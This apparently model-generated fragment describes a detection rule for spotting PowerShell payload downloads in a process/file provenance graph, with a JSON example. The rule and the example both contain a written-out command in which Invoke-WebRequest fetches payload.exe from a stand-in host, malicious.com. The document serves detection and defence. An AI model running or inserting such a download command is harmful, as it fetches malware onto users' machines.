<output>
1. **Identify Payload Download via PowerShell**  
   - Monitor for events where the `srcNode` is a PowerShell process.  
   - Set the `relation` to "Process Create" for the PowerShell process.  
   - Ensure the `dstNode` indicates a file creation event for the downloaded executable.  
   - The `dstNode` should have the `Image` field set to the path of the malicious executable (e.g., `C:\\Users\\User\\Downloads\\payload.exe`).  
   - The `srcNode` should have the `Cmdline` field containing the PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\\Users\\User\\Downloads\\payload.exe`.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "Cmdline": "powershell.exe -Command Invoke-WebRequest -Uri http://malicious.com/payload.exe -OutFile C:\\Users\\User\\Downloads\\payload.exe",
         "Type": "Process"
       },
       "dstNode": {
         "Image": "C:\\Users\\User\\Downloads\\payload.exe",
         "Type": "File"
       },
       "relation": "Process Create"
     }
     ```
</output>